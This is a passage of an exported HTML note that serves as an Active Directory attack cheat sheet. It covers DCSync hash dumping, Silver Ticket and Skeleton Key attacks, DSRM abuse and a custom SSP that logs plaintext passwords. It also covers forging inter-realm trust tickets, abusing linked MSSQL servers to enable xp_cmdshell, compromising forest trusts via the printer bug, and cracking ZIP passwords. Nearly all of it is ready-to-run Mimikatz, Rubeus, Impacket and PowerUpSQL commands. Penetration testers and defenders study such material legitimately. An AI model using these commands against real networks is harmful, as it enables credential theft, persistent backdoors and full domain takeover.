secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;<span class="hljs-selector-tag">@</span>&lt;DC<span class="hljs-string">&#x27;S IP or FQDN&gt; -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC&#x27;</span>S IP or FQDN&gt; <span class="hljs-literal">-just-dc-ntlm</span></code></pre></div>
<p><strong>Tip:</strong> <br>
/ptt -&gt; inject ticket on current running session <br>
/ticket -&gt; save the ticket on the system for later use</p>
<h3 id="silver-ticket-attack">Silver Ticket Attack</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Invoke-Mimikatz -Command '&quot;kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:
&lt;ServiceType&gt; /rc4:&lt;TheSPN's Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt&quot;'</pre><pre class="hljs"><code><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:
&lt;ServiceType&gt; /rc4:&lt;TheSPN&#x27;</span>s Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt<span class="hljs-string">&quot;&#x27;</span></code></pre></div>
<p><a data-from-md title='https://adsecurity.org/?page_id=183' href='https://adsecurity.org/?page_id=183'>SPN List</a></p>
<h3 id="skeleton-key-attack">Skeleton Key Attack</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '&quot;privilege::debug&quot; &quot;misc::skeleton&quot;' -ComputerName &lt;DC's FQDN&gt;

#Access using the password &quot;mimikatz&quot;
Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator</pre><pre class="hljs"><code><span class="hljs-comment">#Exploitation Command runned as DA:</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#x27;</span> <span class="hljs-literal">-ComputerName</span> &lt;DC<span class="hljs-string">&#x27;s FQDN&gt;

#Access using the password &quot;mimikatz&quot;
Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator</span></code></pre></div>
<h3 id="dsrm-abuse">DSRM Abuse</h3>
<p><em>WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</em></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '&quot;token::elevate&quot; &quot;lsadump::sam&quot;' -ComputerName &lt;DC's Name&gt;

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName &lt;DC's Name&gt;

#Alter the Logon behaviour on registry:
New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name &quot;DsrmAdminLogonBehaviour&quot; -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name &quot;DsrmAdminLogonBehaviour&quot; -Value 2 -Verbose</pre><pre class="hljs"><code><span class="hljs-comment">#Dump DSRM password (needs DA privs):</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#x27;</span> <span class="hljs-literal">-ComputerName</span> &lt;DC<span class="hljs-string">&#x27;s Name&gt;

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName &lt;DC&#x27;</span>s Name&gt;

<span class="hljs-comment">#Alter the Logon behaviour on registry:</span>
<span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DsrmAdminLogonBehaviour&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">2</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#If the property already exists:</span>
<span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DsrmAdminLogonBehaviour&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">2</span> <span class="hljs-literal">-Verbose</span></code></pre></div>
<p>Then just PTH to get local admin access on DC!</p>
<h3 id="custom-ssp">Custom SSP</h3>
<p><em>WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</em></p>
<p>From powershell:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Get current Security Package:
$packages = Get-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot; -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += &quot;mimilib&quot;

#Change the new packages name
Set-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot; -Name 'Security Packages' -Value $packages
Set-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '&quot;misc::memssp&quot;'</pre><pre class="hljs"><code><span class="hljs-comment">#Get current Security Package:</span>
<span class="hljs-variable">$packages</span> = <span class="hljs-built_in">Get-ItemProperty</span> <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&#x27;Security Packages&#x27;</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span>  <span class="hljs-string">&#x27;Security Packages&#x27;</span>

<span class="hljs-comment">#Append mimilib:</span>
<span class="hljs-variable">$packages</span> += <span class="hljs-string">&quot;mimilib&quot;</span>

<span class="hljs-comment">#Change the new packages name</span>
<span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&#x27;Security Packages&#x27;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$packages</span>
<span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&#x27;Security Packages&#x27;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$packages</span>

<span class="hljs-comment">#ALTERNATIVE:</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;misc::memssp&quot;&#x27;</span></code></pre></div>
<p>Now all logons on the DC are logged to -&gt; C:\Windows\System32\kiwissp.log</p>
<h2 id="cross-forest-attacks">Cross Forest Attacks</h2>
<h3 id="trust-tickets">Trust Tickets</h3>
<p><em>WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</em></p>
<p>:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!</p>
<ul>
<li>
<p>Using Mimikatz:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Dump the trust key
Invoke-Mimikatz -Command '&quot;lsadump::trust /patch&quot;'
Invoke-Mimikatz -Command '&quot;lsadump::lsa /patch&quot;'

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '&quot;kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:
&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:
&lt;PathToSaveTheGoldenTicket&gt;&quot;'</pre><pre class="hljs"><code><span class="hljs-comment">#Dump the trust key</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;lsadump::trust /patch&quot;&#x27;</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;lsadump::lsa /patch&quot;&#x27;</span>

<span class="hljs-comment">#Forge an inter-realm TGT using the Golden Ticket attack</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:
&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:
&lt;PathToSaveTheGoldenTicket&gt;&quot;&#x27;</span></code></pre></div>
<p>:exclamation: Tickets -&gt; .kirbi format</p>
<p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p>
</li>
<li>
<p>Using Rubeus:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">.\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:&quot;Service's SPN&quot; /ptt</pre><pre class="hljs"><code>.\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:<span class="hljs-string">&quot;Service&#x27;s SPN&quot;</span> /ptt</code></pre></div>
</li>
</ul>
<h3 id="abuse-mssql-servers">Abuse MSSQL Servers</h3>
<ul>
<li>
<p>Enumerate MSSQL Instances: <code class="inline-code">Get-SQLInstanceDomain</code></p>
</li>
<li>
<p>Check Accessibility as current user:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose</pre><pre class="hljs"><code><span class="hljs-built_in">Get-SQLConnectionTestThreaded</span>
<span class="hljs-built_in">Get-SQLInstanceDomain</span> | <span class="hljs-built_in">Get-SQLConnectionTestThreaded</span> <span class="hljs-literal">-Verbose</span></code></pre></div>
</li>
<li>
<p>Gather Information about the instance: <code class="inline-code">Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></p>
</li>
<li>
<p>Abusing SQL Database Links: <br>
<em>WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</em></p>
</li>
</ul>
<p>Check for existing Database Links:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instance &lt;SPN&gt; -Verbose

#MSSQL Query:
select * from master..sysservers</pre><pre class="hljs"><code><span class="hljs-comment">#Check for existing Database Links:</span>
<span class="hljs-comment">#PowerUpSQL:</span>
<span class="hljs-built_in">Get-SQLServerLink</span> <span class="hljs-literal">-Instance</span> &lt;SPN&gt; <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#MSSQL Query:</span>
<span class="hljs-built_in">select</span> * from master..sysservers</code></pre></div>
<p>Then we can use queries to enumerate other links from the linked Database:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Manualy:
select * from openquery(&quot;LinkedDatabase&quot;, 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;') AT &quot;SPN&quot;</pre><pre class="hljs"><code><span class="hljs-comment">#Manualy:</span>
<span class="hljs-built_in">select</span> * from openquery(<span class="hljs-string">&quot;LinkedDatabase&quot;</span>, <span class="hljs-string">&#x27;select * from master..sysservers&#x27;</span>)

<span class="hljs-comment">#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):</span>
<span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> &lt;SPN&gt; <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#Then we can execute command on the machine&#x27;s were the SQL Service runs using xp_cmdshell</span>
<span class="hljs-comment">#Or if it is disabled enable it:</span>
EXECUTE(<span class="hljs-string">&#x27;sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;&#x27;</span>) AT <span class="hljs-string">&quot;SPN&quot;</span></code></pre></div>
<p>Query execution:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query &quot;exec master..xp_cmdshell 'whoami'&quot;</pre><pre class="hljs"><code><span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instace</span> &lt;SPN&gt; <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;</span></code></pre></div>
<h3 id="breaking-forest-trusts">Breaking Forest Trusts</h3>
<p><em>WUT IS DIS?: <br>
TL;DR <br>
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.</em></p>
<p>Tools we are going to use:</p>
<ul>
<li><a data-from-md title='https://github.com/GhostPack/Rubeus' href='https://github.com/GhostPack/Rubeus'>Rubeus</a></li>
<li><a data-from-md title='https://github.com/leechristensen/SpoolSample' href='https://github.com/leechristensen/SpoolSample'>SpoolSample</a></li>
<li><a data-from-md title='https://github.com/gentilkiwi/mimikatz' href='https://github.com/gentilkiwi/mimikatz'>Mimikatz</a></li>
</ul>
<p>Exploitation example:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all</pre><pre class="hljs"><code><span class="hljs-comment">#Start monitoring for TGTs with rubeus:</span>
Rubeus.exe monitor /interval:<span class="hljs-number">5</span> /filteruser:tar<span class="hljs-built_in">get-dc</span><span class="hljs-variable">$</span>

<span class="hljs-comment">#Execute the printerbug to trigger the force authentication of the target DC to our machine</span>
SpoolSample.exe tar<span class="hljs-built_in">get-dc</span><span class="hljs-variable">$</span>.external.forest.local dc.compromised.domain.local

<span class="hljs-comment">#Get the base64 captured TGT from Rubeus and inject it into memory:</span>
Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;

<span class="hljs-comment">#Dump the hashes of the target domain using mimikatz:</span>
lsadump::dcsync /domain:external.forest.local /all</code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a data-from-md title='https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/' href='https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/'>Not A Security Boundary: Breaking Forest Trusts</a></li>
<li><a data-from-md title='https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1' href='https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1'>Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</a></li>
</ul>
<h3 id="ad-mindmap">AD Mindmap</h3>
<p><a data-from-md title='https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg' href='https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg'>MindMap</a></p>
<h2 id="zip">ZIP</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip

zip2john file.zip &gt; zip.john
john --wordlist=&lt;PASSWORDS_LIST&gt; zip.john</pre><pre class="hljs"><code>fcrackzip -<span class="hljs-keyword">u</span> -<span class="hljs-keyword">D</span> -p &#x27;/usr/share/wordlists/rockyou.txt&#x27; <span class="hljs-keyword">file</span>.<span class="hljs-keyword">zip</span>

zip2john <span class="hljs-keyword">file</span>.<span class="hljs-keyword">zip</span> &gt; <span class="hljs-keyword">zip</span>.john
john --wordlist=&lt;PASSWORDS_LIST&gt; <span class="hljs-keyword">zip</span>.john</code></pre></div>
</div></div>
					</body>
				</html>
			